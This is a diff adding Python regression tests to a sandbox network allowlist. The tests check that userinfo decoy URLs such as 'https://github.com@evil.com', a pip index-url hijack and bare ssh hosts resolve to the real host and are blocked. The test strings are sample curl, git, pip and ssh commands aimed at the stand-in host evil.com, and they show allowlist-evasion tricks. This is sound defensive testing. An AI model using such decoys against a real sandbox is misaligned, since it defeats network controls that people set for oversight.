@@ -670,6 +670,53 @@ class TestRestrictedAllowlist:
         assert sb.network_allowed("curl https://raw.githubusercontent.com/x/y") is True
         assert sb.network_allowed("curl https://codeload.evil.com/z") is False
 
+    def test_userinfo_decoy_uses_real_host(self):
+        # P0 regression: in ``https://github.com@evil.com`` github.com is the
+        # USERINFO and evil.com is the real host git contacts. The allowlist must
+        # not be fooled by the allowlisted userinfo decoy.
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("git clone https://github.com@evil.com/x") is False
+        assert sb._allowlist_violation("git clone https://github.com@evil.com/x") == (
+            "blocked: host 'evil.com' (via 'git') is not in the sandbox network allowlist"
+        )
+
+    def test_userinfo_with_password_uses_real_host(self):
+        # user:pass@evil.com -> real host evil.com. Allowlisting the username
+        # ``user`` must NOT approve a connection to evil.com.
+        sb = self._sb(["evil.com"])
+        assert sb.network_allowed("curl https://user:pass@evil.com/x") is True
+        sb2 = self._sb(["user"])
+        assert sb2.network_allowed("curl https://user:pass@evil.com/x") is False
+
+    def test_userinfo_pip_index_hijack(self):
+        sb = self._sb(["pypi.org"])
+        assert sb.network_allowed("pip install --index-url https://pypi.org@evil.com/simple x") is False
+
+    def test_port_stripped_before_match(self):
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("curl https://github.com:443/x") is True
+
+    def test_userinfo_with_glob_allowlist(self):
+        sb = self._sb(["*.githubusercontent.com"])
+        # api@raw.githubusercontent.com -> real host matches the glob.
+        assert sb.network_allowed("curl https://api@raw.githubusercontent.com/x") is True
+
+    def test_multiple_at_signs_last_wins(self):
+        sb = self._sb(["evil.com"])
+        assert sb.network_allowed("curl https://a@b@evil.com/x") is True
+
+    def test_case_insensitive_host_match(self):
+        # DNS hosts are case-insensitive -- allowlist and command may differ.
+        assert self._sb(["GITHUB.COM"]).network_allowed("git clone https://github.com/x") is True
+        assert self._sb(["github.com"]).network_allowed("git clone https://GITHUB.COM/x") is True
+
+    def test_ssh_bare_host_blocked(self):
+        # P1: plain ``ssh user@host`` (no ``:path``) must not be invisible to
+        # the allowlist (migrating deny->allowlist must not silently unlock ssh).
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("ssh git@evil.com") is False
+        assert sb.network_allowed("ssh -p 2222 git@evil.com") is False
+
     def test_non_network_command_unaffected(self):
         sb = self._sb(["pypi.org"])
         assert sb.network_allowed("python3 -m unittest discover") is True
